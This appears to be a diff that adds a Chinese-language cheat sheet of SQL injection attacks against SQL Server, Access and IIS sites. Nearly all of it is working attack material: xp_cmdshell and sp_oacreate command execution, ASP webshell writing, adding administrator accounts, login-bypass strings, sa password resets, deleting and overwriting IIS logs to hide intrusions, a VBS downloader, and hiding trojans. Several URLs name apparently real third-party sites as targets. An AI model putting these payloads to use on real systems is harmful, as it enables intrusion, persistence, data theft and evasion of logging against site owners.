@@ -1,0 +1,1142 @@
+ 
+ 
+ 
+                                                                                  (1)
+                                                                                 
+ 判断数据库类型:                                                                                 
+ 
+ Access:
+ 
+ aNd aSc(cHr(97))=97
+ and exists(select id from MSysAccessObjects)
+
+
+SQL Server:
+ and exists(select id from sysobjects)
+
+
+MySQL:
+ and length(user())>0                                                 
+                                                                                  
+                                                                                  
+搜索栏里输入
+关键字%'and 1=1 and '%'='
+关键字%'and 1=2 and '%'='
+比较不同处 可以作为注入的特征字符
+
+1、    用^转义字符来写ASP(一句话木马)文件的方法:
+
+   http://192.168.1.5/display.asp?keyno=1881;exec master.dbo.xp_cmdshell 'echo ^<script language=VBScript runat=server^>execute request^("l"^)^</script^> >c:\mu.asp';--
+
+   echo ^<%execute^(request^("l"^)^)%^> >c:\mu.asp
+
+    显示SQL系统版本：
+  http://192.168.1.5/display.asp?keyno=188 and 1=(select @@VERSION)
+  
+ http://www.xxxx.com/FullStory.asp?id=1 and 1=convert(int,@@version)--
+
+Microsoft VBScript 编译器错误 错误 '800a03f6'
+缺少 'End'
+/iisHelp/common/500-100.asp，行242
+Microsoft OLE DB Provider for ODBC Drivers 错误 '80040e07'
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'Microsoft SQL Server 2000 - 8.00.760 (Intel X86) Dec 17 2002 14:22:05 Copyright (c) 1988-2003 Microsoft Corporation Desktop Engine on Windows NT 5.0 (Build 2195: Service Pack 4) ' to a column of data type int.
+/display.asp，行17
+3、    在检测索尼中国的网站漏洞时，分明已经确定了漏洞存在却无法在这三种漏洞中找到对应的类型。偶然间我想到了在SQL语言中可以使用“in”关键字进行查询，例如“select * from mytable where id in(1)”，括号中的值就是我们提交的数据，它的结果与使用“select * from mytable where id=1”的查询结果完全相同。所以访问页面的时候在URL后面加上“) and 1=1 and 1 in(1”后原来的SQL语句就变成了“select * from mytable where id in(1) and 1=1 and 1 in(1)”，这样就会出现期待已久的页面了。暂且就叫这种类型的漏洞为“包含数字型”吧，聪明的你一定想到了还有“包含字符型”呢。对了，它就是由于类似“select * from mytable where name in('firstsee')”的查询语句造成的。
+
+4、    判断xp_cmdshell扩展存储过程是否存在：
+http://192.168.1.5/display.asp?keyno=188 and 1=(select count(*) FROM master.dbo.sysobjects where xtype = 'X' AND name = 'xp_cmdshell')
+恢复xp_cmdshell扩展存储的命令：
+http://www.test.com/news/show1.asp?NewsId=125272
+;exec master.dbo.sp_addextendedproc 'xp_cmdshell','e:\inetput\web\xplog70.dll';--
+
+5、    向启动组中写入命令行和执行程序：
+http://192.168.1.5/display.asp?keyno=188;EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run','help1','REG_SZ','cmd.exe /c net user test ptlove /add'
+
+
+6、    查看当前的数据库名称：
+?   http://192.168.1.5/display.asp?keyno=188 and 0<>db_name(n) n改成0,1,2,3……就可以跨库了
+?   http://www.xxxx.com/FullStory.asp?id=1 and 1=convert(int,db_name())--
+Microsoft VBScript 编译器错误 错误 '800a03f6'
+缺少 'End'
+/iisHelp/common/500-100.asp，行242
+Microsoft OLE DB Provider for ODBC Drivers 错误 '80040e07'
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'huidahouse' to a column of data type int.
+/display.asp，行17
+7、    列出当前所有的数据库名称：
+select * from master.dbo.sysdatabases    列出所有列的记录
+select name from master.dbo.sysdatabases 仅列出name列的记录
+
+8、    不需xp_cmdshell支持在有注入漏洞的SQL服务器上运行CMD命令：
+create TABLE mytmp(info VARCHAR(400),ID int IDENTITY(1,1) NOT NULL)
+DECLARE @shell INT
+DECLARE @fso INT
+DECLARE @file INT
+DECLARE @isEnd BIT
+DECLARE @out VARCHAR(400)
+EXEC sp_oacreate 'wscript.shell',@shell output
+EXEC sp_oamethod @shell,'run',null,'cmd.exe /c dir c:\>c:\temp.txt','0','true'
+--注意run的参数true指的是将等待程序运行的结果，对于类似ping的长时间命令必需使用此参数。
+
+EXEC sp_oacreate 'scripting.filesystemobject',@fso output
+EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt'
+--因为fso的opentextfile方法将返回一个textstream对象，所以此时@file是一个对象令牌
+
+WHILE @shell>0
+BEGIN
+EXEC sp_oamethod @file,'Readline',@out out
+insert INTO MYTMP(info) VALUES (@out)
+EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out
+IF @isEnd=1 BREAK
+ELSE CONTINUE
+END
+
+drop TABLE MYTMP
+
+----------
+DECLARE @shell INT
+DECLARE @fso INT
+DECLARE @file INT
+DECLARE @isEnd BIT
+DECLARE @out VARCHAR(400)
+EXEC sp_oacreate 'wscript.shell',@shell output
+EXEC sp_oamethod @shell,'run',null,'cmd.exe /c cscript C:\Inetpub\AdminScripts\adsutil.vbs set /W3SVC/InProcessIsapiApps "C:\WINNT\system32\idq.dll" "C:\WINNT\system32\inetsrv\httpext.dll" "C:\WINNT\system32\inetsrv\httpodbc.dll" "C:\WINNT\system32\inetsrv\ssinc.dll" "C:\WINNT\system32\msw3prt.dll" "C:\winnt\system32\inetsrv\asp.dll">c:\temp.txt','0','true'
+EXEC sp_oacreate 'scripting.filesystemobject',@fso output
+EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt'
+WHILE @shell>0
+BEGIN
+EXEC sp_oamethod @file,'Readline',@out out
+insert INTO MYTMP(info) VALUES (@out)
+EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out
+IF @isEnd=1 BREAK
+ELSE CONTINUE
+END
+
+以下是一行里面将WEB用户加到管理员组中：
+DECLARE @shell INT DECLARE @fso INT DECLARE @file INT DECLARE @isEnd BIT DECLARE @out VARCHAR(400) EXEC sp_oacreate 'wscript.shell',@shell output EXEC sp_oamethod @shell,'run',null,'cmd.exe /c cscript C:\Inetpub\AdminScripts\adsutil.vbs set /W3SVC/InProcessIsapiApps "C:\WINNT\system32\idq.dll" "C:\WINNT\system32\inetsrv\httpext.dll" "C:\WINNT\system32\inetsrv\httpodbc.dll" "C:\WINNT\system32\inetsrv\ssinc.dll" "C:\WINNT\system32\msw3prt.dll" "C:\winnt\system32\inetsrv\asp.dll">c:\temp.txt','0','true' EXEC sp_oacreate 'scripting.filesystemobject',@fso output EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt' WHILE @shell>0 BEGIN EXEC sp_oamethod @file,'Readline',@out out insert INTO MYTMP(info) VALUES (@out) EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out IF @isEnd=1 BREAK ELSE CONTINUE END
+
+以下是一行中执行EXE程序：
+DECLARE @shell INT DECLARE @fso INT DECLARE @file INT DECLARE @isEnd BIT DECLARE @out VARCHAR(400) EXEC sp_oacreate 'wscript.shell',@shell output EXEC sp_oamethod @shell,'run',null,'cmd.exe /c cscript.exe E:\bjeea.net.cn\score\fts\images\iis.vbs lh1 c:\>c:\temp.txt','0','true' EXEC sp_oacreate 'scripting.filesystemobject',@fso output EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt' WHILE @shell>0 BEGIN EXEC sp_oamethod @file,'Readline',@out out insert INTO MYTMP(info) VALUES (@out) EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out IF @isEnd=1 BREAK ELSE CONTINUE END
+
+SQL下三种执行CMD命令的方法：
+
+先删除7.18号日志：
+(1)exec master.dbo.xp_cmdshell 'del C:\winnt\system32\logfiles\W3SVC5\ex050718.log >c:\temp.txt'
+
+(2)DECLARE @shell INT DECLARE @fso INT DECLARE @file INT DECLARE @isEnd BIT DECLARE @out VARCHAR(400) EXEC sp_oacreate 'wscript.shell',@shell output EXEC sp_oamethod @shell,'run',null,'cmd.exe /c del C:\winnt\system32\logfiles\W3SVC5\ex050718.log >c:\temp.txt','0','true' EXEC sp_oacreate 'scripting.filesystemobject',@fso output EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt' WHILE @shell>0 BEGIN EXEC sp_oamethod @file,'Readline',@out out insert INTO MYTMP(info) VALUES (@out) EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out IF @isEnd=1 BREAK ELSE CONTINUE END
+
+（3）首先开启jet沙盘模式，通过扩展存储过程xp_regwrite修改注册表实现，管理员修改注册表不能预防的原因。出于安全原因，默认沙盘模式未开启，这就是为什么需要xp_regwrite的原因，而xp_regwrite至少需要DB_OWNER权限，为了方便，这里建议使用sysadmin 权限测试：
+?    exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+注：
+0    禁止一切（默认）
+1    使能访问ACCESS，但是禁止其它
+2    禁止访问ACCESS，但是使能其他
+3    使能一切
+
+?    这里仅给出sysadmin权限下使用的命令：
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\winnt\system32\ias\ias.mdb','select shell("cmd.exe /c net user admin admin1234 /add")')
+
+
+?    建立链接数据库'L0op8ack'参考命令：
+EXEC sp_addlinkedserver 'L0op8ack','OLE DB Provider for Jet','Microsoft.Jet.OLEDB.4.0','c:\windows\system32\ias\ias.mdb'
+
+?    如何使用链接数据库：
+
+使用这个方式可以执行，但是很不幸，DB_OWNER权限是不够的，需要至少sysadmin权限或者securityadmin+setupadmin权限组合
+sp_addlinkedserver需要sysadmin或setupadmin权限
+sp_addlinkedsrvlogin需要sysadmin或securityadmin权限
+最终发现，还是sa权限或者setupadmin+securityadmin权限帐户才能使用，
+一般没有哪个管理员这么设置普通帐户权限的
+
+实用性不强，仅作为一个学习总结吧
+
+大致过程如下，如果不是sysadmin，那么IAS.mdb权限验证会出错，
+我测试的时候授予hacker这个用户setupadmin+securityadmin权限，使用ias.mdb失败
+需要找一个一般用户可访问的mdb才可以：
+
+?    新建链接服务器”L0op8ack”:EXEC sp_addlinkedserver 'L0op8ack','JetOLEDB','Microsoft.Jet.OLEDB.4.0','c:\winnt\system32\ias\ias.mdb';--
+?    exec sp_addlinkedsrvlogin 'L0op8ack','false';--或
+exec sp_addlinkedsrvlogin 'L0op8ack', 'false', NULL, 'test1', 'ptlove';--
+?    select * FROM OPENQUERY(L0op8ack, 'select shell("cmd.exe /c net user")');--
+?    exec sp_droplinkedsrvlogin 'L0op8ack','false';--
+?    exec sp_dropserver 'L0op8ack';--
+
+再考贝一个其它文件来代替7.18日文件：
+(1)exec master.dbo.xp_cmdshell 'copy C:\winnt\system32\logfiles\W3SVC5\ex050716.log C:\winnt\system32\logfiles\W3SVC5\ex050718.log>c:\temp.txt'
+
+(2)DECLARE @shell INT DECLARE @fso INT DECLARE @file INT DECLARE @isEnd BIT DECLARE @out VARCHAR(400) EXEC sp_oacreate 'wscript.shell',@shell output EXEC sp_oamethod @shell,'run',null,'cmd.exe /c copy C:\winnt\system32\logfiles\W3SVC5\ex050716.log C:\winnt\system32\logfiles\W3SVC5\ex050718.log>c:\temp.txt','0','true' EXEC sp_oacreate 'scripting.filesystemobject',@fso output EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt' WHILE @shell>0 BEGIN EXEC sp_oamethod @file,'Readline',@out out insert INTO MYTMP(info) VALUES (@out) EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out IF @isEnd=1 BREAK ELSE CONTINUE END
+
+(3)DECLARE @shell INT DECLARE @fso INT DECLARE @file INT DECLARE @isEnd BIT DECLARE @out VARCHAR(400) EXEC sp_oacreate 'wscript.shell',@shell output EXEC sp_oamethod @shell,'run',null,'cmd.exe /c net user>c:\temp.txt','0','true' EXEC sp_oacreate 'scripting.filesystemobject',@fso output EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt' WHILE @shell>0 BEGIN EXEC sp_oamethod @file,'Readline',@out out insert INTO MYTMP(info) VALUES (@out) EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out IF @isEnd=1 BREAK ELSE CONTINUE END
+
+9、    用update来更新表中的数据：
+HTTP://xxx.xxx.xxx/abc.asp?p=YY;update upload.dbo.admin set pwd='a0b923820dcc509a' where username='www';--
+www用户密码的16位MD5值为：a0b923820dcc509a，即把密码改成1；
+32位MD5值为：    ，密码为
+
+10、    利用表内容导成文件功能
+SQL有BCP命令，它可以把表的内容导成文本文件并放到指定位置。利用这项功能，我们可以先建一张临时表，然后在表中一行一行地输入一个ASP木马，然后用BCP命令导出形成ASP文件。
+命令行格式如下：
+bcp "select * from temp " queryout c:\inetpub\wwwroot\runcommand.asp –c –S localhost –U sa –P upload('S'参数为执行查询的服务器，'U'参数为用户名，'P'参数为密码，最终上传了一个runcommand.asp的木马)。
+
+11、创建表、播入数据和读取数据的方法
+?    创建表：
+' and 1=1 un&#105;on select 1,2,3,4;create table [dbo].[cyfd]([gyfd][char](255))--
+?    往表里播入数据：
+' and 1=1 un&#105;on select 1,2,3,4;DECLARE @result varchar(255) select top 1 name from upload.dbo.sysobjects where xtype='U' and status>0,@result output insert into cyfd (gyfd) values(@result);--
+' and 1=1 un&#105;on select 1,2,3,4;DECLARE @result varchar(255) exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CONTROLSet001\Services\W3SVC\Parameters\Virtual Roots', '/' ,@result output insert into cyfd (gyfd) values(@result);--
+?    从表里读取数据：
+' and 1=(select count(*) from cyfd where gyfd >1)--
+
+?    删除临时表：
+';drop table cyfd;--
+
+12、通过SQL语句直接更改sa的密码：
+?    update master.dbo.sysxlogins set password=0x0100AB01431E944AA50CBB30267F53B9451B7189CA67AF19A1FC944AA50CBB30267F53B9451B7189CA67AF19A1FC where sid=0x01,这样sa的密码就被我们改成了111111拉。呵呵，解决的方法就是把sa给删拉。，怎么删可以参考我的《完全删除sa这个后门》。
+
+?    查看本机所有的数据库用户名：
+select * from master.dbo.sysxlogins
+select name,sid,password ,dbid from master.dbo.sysxlogins
+
+?    更改sa口令方法：用sql综合利用工具连接后，执行命令：
+exec sp_password NULL,'新密码','sa'
+
+13、查询dvbbs库中所有的表名和表结构：
+?    select * from dvbbs.dbo.sysobjects where xtype='U' and status>0
+?    select * from dvbbs.dbo.syscolumns where id=1426104121
+
+14、手工备份当前数据库：
+完全备份：
+;declare @a sysname,@s nvarchar(4000)
+select @a=db_name(),@s='c:/db1' backup database @a to disk=@s WITH formAT--
+差异备份：
+;declare @a sysname,@s nvarchar(4000)
+select @a=db_name(),@s='c:/db1' backup database @a to disk=@s WITH DIFFERENTIAL,formAT—
+
+15、添加和删除一个SA权限的用户test：
+exec master.dbo.sp_addlogin test,ptlove
+exec master.dbo.sp_addsrvrolemember test,sysadmin
+
+cmd.exe /c isql -E /U alma /P /i K:\test.qry
+
+16、select * from ChouYFD.dbo.sysobjects where xtype='U' and status>0
+就可以列出库ChouYFD中所有的用户建立的表名。
+select name,id from ChouYFD.dbo.sysobjects where xtype='U' and status>0
+
+17、
+?   http://www.npc.gov.cn/zgrdw/common/image_view.jsp?sqlstr=select * from rdweb.dbo.syscolumns （where id=1234）
+列出rdweb库中所有表中的字段名称
+?    select * from dvbbs.dbo.syscolumns where id=5575058
+列出库dvbbs中表id=5575058的所有字段名
+
+18、删除记录命令：delete from Dv_topic where boardid=5 and topicid=7978
+
+19、绕过登录验证进入后台的方法整理：
+1) ' or''='
+2) ' or 1=1--
+3) ' or 'a'='a--
+4) 'or'='or'
+5) " or 1=1--
+6）or 1=1--
+7） or 'a='a
+8）" or "a"="a
+9） ') or ('a'='a
+10） ") or ("a"="a
+11） ） or (1=1
+12) 'or''='
+13) 人气%' and 1=1 and '%'='
+
+20、寻找网站路径的方法汇总：
+1）查看WEB网站安装目录命令：
+?    cscript c:\inetpub\adminscripts\adsutil.vbs enum w3svc/2/root >c:\test1.txt （将2换成1、3、4、5试试）
+type c:\test1.txt
+del c:\test1.txt
+在NBSI下可以直接显示运行结果，所以不用导出到文件
+
+2）在网站上随便找到一个图片的名字 123.jpg
+然后写进批处理程序123.bat:
+d:
+dir 123.jpg /s >c:\123.txt
+e:
+dir 123.jpg /s >>c:\123.txt
+f:
+dir 123.jpg /s >>c:\123.txt
+
+执行后 type c:\123.txt
+这样来分析网站的路径
+
+3）SQL服务器和网站服务器在同一个服务器上，好了是可以执行命令是吧？
+将执行命令输出结果到
+%windir%\help\iishelp\common\404b.htm或者500.asp
+注意输出前Backup这两个文件
+如：
+dir c:\ >%windir%\help\iishelp\common\404b.htm
+然后随便输入一个文件来访问：http://目标ip/2.asp
+
+4）针对win2000系统：xp_regread读取HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots 获取WEB路径
+2003系统：xp_regread读取，未找到方法
+如：
+（1）    新建一个表cyfd(字段为gyfd)：http://www.cnwill.com/NewsShow.aspx?id=4844;create table [dbo].[cyfd]([gyfd][char](255))--
+（2）    把web路径写进去:http://www.cnwill.com/NewsShow.aspx?id=4844;DECLARE @result varchar(255) exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CONTROLSet001\Services\W3SVC\Parameters\Virtual Roots', '/' ,@result output insert into cyfd (gyfd) values(@result);--
+（3）    还是让他不匹配，显示错误:http://www.cnwill.com/NewsShow.aspx?id=4844 and 1=(select count(*) from cyfd where gyfd >1)
+Source: .Net SqlClient Data Provider
+Description: 将 varchar 值 'Y:\Web\烟台人才热线后台管理系统,,201 ' 转换为数据类型为 int 的列时发生语法错误。
+TargeSite: Boolean Read() 哈哈哈。。路径暴露了。。
+（4）接下来删除表:http://www.cnwill.com/NewsShow.aspx?id=4844;drop table cyfd;--
+
+5）用regedit命令导出注册表，将导出的结果保存的路径到%windir%\help\iishelp\common\404b.htm或者500.asp页面
+regedit命令说明：
+Regedit /L:system /R:user /E filename.reg Regpath
+参数含义：
+/L：system指定System.dat文件所在的路径。
+/R：user指定User.dat文件所在的路径。
+/E：此参数指定注册表编辑器要进行导出注册表操作，在此参数后面空一格，输入导出注册表的文件名。
+Regpath：用来指定要导出哪个注册表的分支，如果不指定，则将导出全部注册表分支。在这些参数中，"/L：system"和"/R：user"参数是可选项，如果不使用这两个参数，注册表编辑器则认为是对WINDOWS目录下的"system.dat"和"user.dat"文件进行操作。如果是通过从软盘启动并进入DOS，那么就必须使用"/L"和"/R"参数来指定"system.dat"和"user.dat"文件的具体路径，否则注册表编辑器将无法找到它们。比如说，如果通过启动盘进入DOS，则备份注册表的命令是"Regedit /L:C:\windows\/R:C:\windows\/e regedit.reg",该命令的意思是把整个注册表备份到WINDOWS目录下，其文件名为"regedit.reg"。而如果输入的是"regedit /E D:\regedit.reg"这条命令，则是说把整个注册表备份到D盘的根目录下（省略了"/L"和"/R"参数），其文件名为"Regedit.reg"。
+
+regedit /s c:\adam.reg （导入c:\adam.reg文件至注册表）
+regedit /e c:\web.reg （备份全部注册内容到c:\web.reg中）
+针对win2000系统：C:\>regedit /e %windir%\help\iishelp\common\404b.htm "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots"
+然后http://目标IP/2.asp
+针对win2003系统：没有找到，希望找到的朋友公布出来一起讨论。
+
+6）虚拟主机下%SystemRoot%\system32\inetsrv\MetaBack\下的文件是iis的备份文件，是允许web用户访问的，如果你的iis备份到这里，用webshell下载下来后用记事本打开，可以获取对应的域名和web绝对路径。
+
+7）SQL注入建立虚拟目录，有dbo权限下找不到web绝对路径的一种解决办法：
+我们很多情况下都遇到SQL注入可以列目录和运行命令，但是却很不容易找到web所在目录，也就不好得到一个webshell，这一招不错：
+?    建立虚拟目录win,指向c:\winnt\system32：exec master.dbo.xp_cmdshell 'cscript C:\inetpub\AdminScripts\mkwebdir.vbs -c localhost -w "l" -v "win","c:\winnt\system32"'
+?    让win目录具有解析asp脚本权限：exec master.dbo.xp_cmdshell 'cscript C:\inetpub\AdminScripts\adsutil.vbs set w3svc/1/root/win/Accessexecute "true" –s:'
+?    删除虚拟目录win：exec master.dbo.xp_cmdshell 'cscript C:\inetpub\AdminScripts\adsutil.vbs delete w3svc/1/root/win/'
+?    测试：http://127.0.0.1/win/test.asp
+8）利用SQL语句来查找WEB目录：根据经验，猜疑WEB根目录的顺序是：d盘、e盘、c盘，首先我们建立一个临时表用于存放master..xp_dirtree(适合于public)生成的目录树,用以下语句：
+;create table temp(dir nvarchar(255),depth varchar(255));--,该表的dir字段表示目录的名称，depth字段表示目录的深度。然后执行xp_dirtree获得D盘的目录树，语句如下：
+;insert temp(dir,depth) exec master.dbo.xp_dirtree 'd:';--
+
+在进行下面的操作前，先查看D盘有几个文件夹，这样对D盘有个大致的了解，语句如下：
+and (select count(*) from temp where depth=1 and dir not in('Documents and Settings','Program Files','RECYCLER','System Volume Information','WINDOWS','CAConfig','wmpub','Microsoft UAM 卷'))>=数字(数字=0、1、2、3...)
+
+接着，我们在对方的网站上找几个一级子目录，如user、photo，然后，用筛选的方法来判断WEB根目录上是否存在此盘上，语句如下：
+and (select count(*) from temp where dir<>'user')<(select count(*) from temp)
+
+看语句的返回结果，如果为真，表示WEB根目录有可能在此盘上，为了进一步确认，多测试几个子目录：
+and (select count(*) from temp where dir<>'photo')<(select count(*) from temp)
+
+...
+
+如果所有的测试结果都为真，表示WEB根目录很有可能在此盘上。
+
+下面假设找到的WEB根目录在此盘上，用以下的语句来获得一级子目录的深度：
+and (select depth from temp where dir='user')>=数字(数字=1、2、3...)
+
+假设得到的depth是3,说明user目录是D盘的3级目录，则WEB根目录是D盘的二级目录。
+
+目前我们已经知道了根目录所在的盘符和深度，要找到根目录的具体位置，我们来从D盘根目录开始逐一搜寻，当然，没有必要知道每个目录的名称，否则太耗费时间了。
+
+接下来，另外建立一个临时表，用来存放D盘的1级子目录下的所有目录，语句如下：
+
+;create table temp1(dir nvarchar(255),depth varchar(255));--
+
+然后把从D盘的第一个子目录下的所有目录存到temp1中，语句如下：
+declare @dirname varchar(255);set @dirname='d:\'+(select top 1 dir from (select top 1 dir from temp where depth=1 and dir not in('Documents and Settings','Program Files','RECYCLER','System Volume Information','WINDOWS','CAConfig','wmpub','Microsoft UAM 卷') order by dir desc)T order by dir);insert into temp1 exec master.dbo.xp_dirtree @dirname
+当然也可以把D盘的第二个子目录下的所有目录存到temp1中，只需把第二个top 1改为top 2就行了。
+
+现在，temp1中已经保存了所有D盘第一级子目录下的所有目录,然后，我们用同样的方法来判断根目录是否在此一级子目录下：
+and (select count(*) from temp1 where dir<>'user')<(select count(*) from temp1)
+如果返回为真，表示根目录可能在此子目录下，记住要多测试几个例子，如果都返回为假，则表明WEB根目录不在此目录下，然后我们在用同样的方法来获得D盘第2、3...个子目录下的所有目录列表，来判断WEB根目录是否在其下。但是，要注意，用xp_dirtree前一定要把temp1表中的内容删除。
+
+现在假设，WEB根目录在D盘的第一级子目录下，该子目录名称为website,怎样获得这个目录的名称我想不用我说了吧。因为前面我们知道了WEB根目录的深度为2，我们需要知道website下到底哪个才是真正的WEB根目录。
+
+现在，我们用同样的方法，再建立第3个临时表：
+;create table temp2(dir nvarchar(255),depth varchar(255));--
+
+然后把从D盘的website下的所有目录存到temp2中，语句如下：
+declare @dirname varchar(255);set @dirname='d:\website\'+(select top 1 dir from (select top 1 dir from temp1 where depth=1 and dir not in('Documents and Settings','Program Files','RECYCLER','System Volume Information','WINDOWS','CAConfig','wmpub','Microsoft UAM 卷') order by dir desc)T order by dir);insert into temp2 exec master.dbo.xp_dirtree @dirname
+当然也可以把D盘的website下第二个子目录下的所有目录存到temp2中，只需把第二个top 1改为top 2就行了。
+
+现在，我们用同样的方法判断该目录是否为根目录：
+and (select count(*) from temp2 where dir<>'user')<(select count(*) from temp2)
+如果返回为真，为了确定我们的判断，多测试几个例子，方法上面都讲到了，如果多个例子都返回为真，那么就确定了该目录为WEB根目录。
+
+
+用以上的方法基本上可以获得WEB根目录，现在我们假设WEB根目录是：D:\website\www
+然后，我们就可以备份当前数据库到这个目录下用来下载。备份前我们把temp、temp1、temp2的内容清空，然后C、D、E盘的目录树分别存到temp、temp1、temp2中。
+
+下载完数据库后要记得把三个临时表drop掉，现在我们在下载的数据库中可以找到所有的目录列表，包括后台管理的目录以及更多信息。
+
+21、win2000下将WEB用户提升为系统用户权限，需要有管理员的权限才能执行：
+c:\>cscript C:\Inetpub\AdminScripts\adsutil.vbs set /W3SVC/InProcessIsapiApps "C:\WINNT\system32\idq.dll" "C:\WINNT\system32\inetsrv\httpext.dll" "C:\WINNT\system32\inetsrv\httpodbc.dll" "C:\WINNT\system32\inetsrv\ssinc.dll" "C:\WINNT\system32\msw3prt.dll" "C:\winnt\system32\inetsrv\asp.dll"
+
+cscript C:\Inetpub\AdminScripts\adsutil.vbs set /W3SVC/InProcessIsapiApps "C:\windows\system32\idq.dll" "C:\windows\system32\inetsrv\httpext.dll" "C:\windows\system32\inetsrv\httpodbc.dll" "C:\windows\system32\inetsrv\ssinc.dll" "C:\windows\system32\msw3prt.dll" "C:\windows\system32\inetsrv\asp.dll"
+
+查看是否成功：
+c:\>cscript C:\Inetpub\AdminScripts\adsutil.vbs get w3svc/inprocessisapiapps
+
+Microsoft (R) Windows Script Host Version 5.6
+版权所有(C) Microsoft Corporation 1996-2001。保留所有权利。
+inprocessisapiapps        : (LIST) (6 Items)
+"C:\WINNT\system32\idq.dll"
+"C:\WINNT\system32\inetsrv\httpext.dll"
+"C:\WINNT\system32\inetsrv\httpodbc.dll"
+"C:\WINNT\system32\inetsrv\ssinc.dll"
+"C:\WINNT\system32\msw3prt.dll"
+"c:\winnt\system32\inetsrv\asp.dll"
+
+22、如何隐藏ASP木马：
+建立非标准目录：mkdir images..\
+拷贝ASP木马至目录：copy c:\inetpub\wwwroot\dbm6.asp c:\inetpub\wwwroot\images..\news.asp
+通过web访问ASP木马：http://ip/images../news.asp?action=login
+如何删除非标准目录：rmdir images..\ /s
+
+23、去掉tenlnet的ntlm认证：
+;exec master.dbo.xp_cmdshell 'tlntadmn config sec = -ntlm'—
+
+24、用echo写入文件下载脚本iget.vbs:
+(1)echo Set x= createObject(^"Microsoft.XMLHTTP^"):x.Open ^"GET^",LCase(WScript.Arguments(0)),0:x.Send():Set s = createObject(^"ADODB.Stream^"):s.Mode = 3:s.Type = 1:s.Open():s.Write(x.responseBody):s.SaveToFile LCase(WScript.Arguments(1)),2 >c:\iget.vbs
+
+(2)c:\>cscript iget.vbs http://127.0.0.1/asp/dbm6.asp dbm6.asp
+
+
+25、手工建立IIS隐藏目录的方法：
+?    查看本地虚拟目录列表：cscript.exe c:\inetpub\AdminScripts\adsutil.vbs enum w3svc/1/root
+?    新建一个kiss目录：mkdir c:\asp\kiss
+?    建立kiss虚拟目录：cscript.exe c:\inetpub\AdminScripts\mkwebdir.vbs -c MyComputer -w "Default Web Site" -v "kiss","c:\asp\kiss"   
+?    为kiss目录加执行和写权限：
+cscript.exe c:\inetpub\AdminScripts\adsutil.vbs set w3svc/1/root/kiss/kiss/accesswrite "true" -s:
+cscript.exe c:\inetpub\AdminScripts\adsutil.vbs set w3svc/1/root/kiss/accessexecute "true" -s:
+?    ?:Cscript c:\inetpub\AdminScripts\adsutil.vbs set /w3svc/1/root/kiss/createprocessasuser false
+?    访问：http://127.0.0.1/kiss/test.asp
+
+
+
+26、使用openrowset()连回本地做测试：
+select a.*
+FROM OPENROWSET('SQLOLEDB','127.0.0.1';'sa';'111111',
+'select * FROM [dvbbs].[dbo].[dv_admin]') AS a
+
+select * FROM OPENROWSET('SQLOLEDB','127.0.0.1';'sa';'111111',
+'select * FROM [dvbbs].[dbo].[dv_admin]')
+
+27、获得主机名：
+http://www.xxxx.com/FullStory.asp?id=1 and 1=convert(int,@@servername)--
+select convert(int,@@servername)
+select @@servername
+
+28、获得数据库用户名：
+http://www.XXXX.com/FullStory.asp?id=1 and 1=convert(int,system_user)--
+http://www.19cn.com/showdetail.asp?id=49 and user>0
+select user
+
+29、普通用户获得WEBSHELL的方法之二：
+?    打包：
+EXEC [master].[dbo].[xp_makecab] 'c:\test.rar','default',1,'d:\cmd.asp'
+解包，可以用于得到webshell：
+?    EXEC [master].[dbo].[xp_unpackcab] 'C:\test.rar','c:',1, 'n.asp'
+?    读任意文件内容，要求有master的dbo权限：
+EXEC [master].[dbo].[xp_readerrorlog] 1,'c:\cmd.asp'
+
+30、sa 权限下已知web路径直接备份数据库到web路径下
+
+http://www.XXXX.com/FullStory.asp?id=1;backuup database 数据库名 to disk='c:\inetpub\wwwroot\save.db' 则把得到的数据内容全部备份到WEB目录下，再用HTTP把此文件下载(当然首选要知道WEB虚拟目录)。
+
+?    遍历系统的目录结构，分析结果并发现WEB虚拟目录，先创建一个临时表：temp
+http://www.XXXX.com/FullStory.asp?id=1;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--
+?    　接下来：我们可以利用xp_availablemedia来获得当前所有驱动器,并存入temp表中：
+http://www.XXXX.com/FullStory.asp?id=1;insert temp exec master.dbo.xp_availablemedia;--
+?    我们可以通过查询temp的内容来获得驱动器列表及相关信息或者利用xp_subdirs获得子目录列表,并存入temp表中：
+http://www.XXXX.com/FullStory.asp?id=1;insert into temp(id) exec master.dbo.xp_subdirs 'c:\';--
+?    我们还可以利用xp_dirtree获得所有子目录的目录树结构,并寸入temp表中：
+http://www.XXXX.com/FullStory.asp?id=1;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';-- 这样就可以成功的浏览到所有的目录（文件夹）列表
+?    如果我们需要查看某个文件的内容，可以通过执行xp_cmdsell：;insert into temp(id) exec master.dbo.xp_cmdshell 'type c:\web\index.asp';--
